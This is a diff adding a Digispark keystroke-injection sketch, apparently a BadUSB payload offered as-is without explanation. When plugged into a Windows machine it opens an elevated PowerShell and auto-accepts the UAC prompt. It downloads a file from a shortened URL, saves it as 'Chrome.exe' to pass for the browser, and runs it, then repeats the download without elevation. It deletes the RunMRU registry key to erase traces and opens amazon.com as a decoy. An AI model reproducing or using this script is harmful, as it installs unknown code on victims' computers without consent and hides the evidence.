@@ -1,0 +1,42 @@
+#include "DigiKeyboard.h"
+ 
+void setup() {
+// don't need to set anything up to use DigiKeyboard
+}
+ 
+void loop() {
+// this is generally not necessary but with some older systems it seems to
+// prevent missing the first character after a delay:
+DigiKeyboard.sendKeyStroke(0);
+DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+DigiKeyboard.delay(500);
+DigiKeyboard.println("powershell Start-Process powershell -Verb runAs");
+DigiKeyboard.delay(2000);
+DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
+DigiKeyboard.delay(1000);
+DigiKeyboard.sendKeyStroke(KEY_ENTER);
+DigiKeyboard.println("$down = New-Object System.Net.WebClient; $url = 'https://rb.gy/ia5wmb'; $file = 'Chrome.exe'; $down.DownloadFile($url,$file); $exec = New-Object -com shell.application; $exec.shellexecute($file); exit;");
+DigiKeyboard.delay(1000);
+DigiKeyboard.sendKeyStroke(KEY_ENTER);
+DigiKeyboard.delay(500);
+DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+DigiKeyboard.delay(500);
+DigiKeyboard.println("reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f");
+DigiKeyboard.delay(500);
+DigiKeyboard.sendKeyStroke(KEY_ENTER);
+DigiKeyboard.delay(2000);
+DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+DigiKeyboard.delay(500);
+DigiKeyboard.println("powershell.exe");
+DigiKeyboard.delay(2000);
+DigiKeyboard.println("$down = New-Object System.Net.WebClient; $url = 'https://rb.gy/ia5wmb'; $file = 'Chrome.exe'; $down.DownloadFile($url,$file); $exec = New-Object -com shell.application; $exec.shellexecute($file); exit;");
+DigiKeyboard.delay(1000);
+DigiKeyboard.sendKeyStroke(KEY_ENTER);
+DigiKeyboard.delay(2000);
+DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+DigiKeyboard.delay(500);
+DigiKeyboard.println("reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f");
+DigiKeyboard.delay(500);
+DigiKeyboard.sendKeyStroke(KEY_ENTER);
+DigiKeyboard.println("msedge.exe www.amazon.com");
+for(;;){ /*empty*/ }
